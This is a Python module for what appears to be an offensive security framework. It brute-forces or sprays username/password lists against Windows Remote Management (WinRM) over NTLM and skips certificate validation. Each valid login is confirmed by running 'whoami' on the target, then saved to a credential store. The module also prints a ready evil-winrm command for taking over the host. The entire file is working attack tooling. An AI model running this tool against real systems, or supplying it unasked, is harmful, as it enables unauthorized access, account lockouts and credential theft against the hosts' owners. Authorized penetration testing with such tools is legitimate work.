"""WinRM login brute force / spray (pywinrm, NTLM).

WinRM (5985/5986) is the admin-management plane — a hit is an
evil-winrm/powershell session waiting to happen. Validation is real: a
trivial remote command must execute (status 0), so a 'valid' result is
a credential you can actually use, not just a 401-vs-403 guess.

No pass-the-hash: pywinrm's NTLM transport takes passwords only —
use smb_login for hash sprays. HTTPS (5986) via SCHEME=https.
"""

import time

from core.brute import brute_force
from core.module import AuxiliaryModule
from core.options import OptAddress, OptEnum, OptInt, OptPort, OptString
from core.wordlists import build_combos, creds_from_options

try:
    import winrm
    from winrm.exceptions import InvalidCredentialsError
except ImportError:
    winrm = None  # console gates run() on requirements
    InvalidCredentialsError = Exception

ERROR_CIRCUIT = 3  # consecutive transport errors before a host is skipped


class WinrmLogin(AuxiliaryModule):
    name = "WinRM Login Brute Force"
    description = """
        Tries username/password combinations over WinRM (NTLM). A hit
        executes a trivial command to prove the session works — evil-winrm
        -i <host> -u <user> -p <pass> is the next step. DOMAIN='.' for
        local accounts. SCHEME=https for 5986. Stored creds for the host
        are tried first.
    """
    authors = ["you"]
    requirements = ["winrm"]  # the pywinrm package; pip install pywinrm

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Target host(s), comma-separated"))
        self.options.add(OptPort("RPORT", default=5985, description="WinRM port"))
        self.options.add(OptEnum("SCHEME", ["http", "https"], default="http",
                                 description="http (5985) or https (5986)"))
        self.options.add(OptString("DOMAIN", default=".",
                                   description="Auth domain ('.' = local accounts)"))
        self.options.add(OptString("USERNAME", default="",
                                   description="Username(s), comma-separated"))
        self.options.add(OptString("USER_FILE", default="", description="Usernames file"))
        self.options.add(OptString("PASSWORD", default="", description="Single password"))
        self.options.add(OptString("PASS_FILE", default="", description="Passwords file"))
        self.options.add(OptInt("THREADS", default=2,
                                description="Concurrent attempts (keep low)"))
        self.options.add(OptInt("TIMEOUT", default=10,
                                description="Operation timeout (seconds)"))

    def _try(self, host, port, scheme, timeout, domain, state,
             user, password):
        """One WinRM session + trivial command -> success | fail | error."""
        if state["abort"]:
            return None
        principal = user if domain in ("", ".") else f"{domain}\\{user}"
        try:
            session = winrm.Session(
                f"{scheme}://{host}:{port}/wsman",
                auth=(principal, password),
                transport="ntlm",
                server_cert_validation="ignore",
                operation_timeout_sec=timeout,
                read_timeout_sec=timeout + 1,
            )
            result = session.run_cmd("whoami")
            if result.status_code == 0:
                who = result.std_out.decode(errors="replace").strip()
                return "success", who or "valid"
            return "fail", f"exit {result.status_code}"
        except InvalidCredentialsError:
            return "fail", "rejected"
        except Exception as e:
            message = str(e)
            lowered = message.lower()
            if any(k in lowered for k in ("timed out", "timeout", "refused",
                                          "unreachable", "connection",
                                          "eof", "reset", "max retries")):
                state["errors"] += 1
                if state["errors"] >= ERROR_CIRCUIT:
                    state["abort"] = True
                    state["dead"] = message
                self.print_debug(f"{host}:{port} {user} -> transport: {e}")
                return "error", message[:60]
            self.print_debug(f"{host}:{port} {user}:{password} -> {message[:60]}")
            return "fail", message[:60]

    def run(self):
        try:
            raw_users = creds_from_options(self.get_option, "USERNAME", "USER_FILE")
            passwords = creds_from_options(self.get_option, "PASSWORD", "PASS_FILE")
        except OSError as e:
            self.print_error(f"Cannot read credential file: {e}")
            return
        # usernames comma-split (sprays need lists inline); passwords never
        # do — commas are legal password characters
        users = [u.strip() for v in raw_users for u in v.split(",") if u.strip()]
        if not users or not passwords:
            self.print_error("Need at least one username and one password "
                             "(USERNAME/USER_FILE, PASSWORD/PASS_FILE)")
            return

        combos = list(build_combos(users, passwords))
        self.print_status(
            f"{len(users)} user(s) x {len(passwords)} password(s) = "
            f"{len(combos)} combinations")
        port = int(self.get_option("RPORT"))
        scheme = str(self.get_option("SCHEME"))
        timeout = int(self.get_option("TIMEOUT"))
        domain = str(self.get_option("DOMAIN") or ".")
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._attack_host(host, port, scheme, timeout, domain, combos)

    def _attack_host(self, host, port, scheme, timeout, domain, combos):
        store = getattr(self.framework, "store", None)
        if store is not None:
            stored = store.creds_for(host, "winrm")
            if stored:
                self.print_status(
                    f"{host}: trying {len(stored)} stored credential(s) first")
                stored_set = set(stored)
                combos = stored + [c for c in combos if c not in stored_set]

        state = {"abort": False, "errors": 0, "locked": None, "dead": None}
        attempt = lambda u, p: self._try(host, port, scheme, timeout,  # noqa: E731
                                         domain, state, u, p)
        classify = lambda verdict: verdict[0]  # noqa: E731

        def on_success(combo, result):
            self.print_good(f"{host}: valid credential "
                            f"{combo[0]}:{combo[1]} ({result[1]})")
            self.print_status(
                f"  -> evil-winrm -i {host} -P {port} "
                f"-u {combo[0]} -p '{combo[1]}'")

        started = time.time()
        found, attempts, errors = brute_force(
            combos, attempt, classify,
            threads=self.get_option("THREADS"),
            join_timeout=timeout + 2,
            on_success=on_success,
        )
        elapsed = max(time.time() - started, 0.001)
        if state["dead"]:
            self.print_warning(
                f"{host}: {ERROR_CIRCUIT} consecutive transport errors — "
                f"host skipped")
        self.print_status(
            f"{host}: {attempts} attempts in {elapsed:.1f}s, "
            f"{len(found)} valid, {errors} errors")

        if store is not None and found:
            store.add_service(host, port, name="winrm")
            for user, pw in found:
                store.add_cred(host, "winrm", user, pw, source="winrm-brute")
                self.print_status("Credential saved ('creds' to view)")
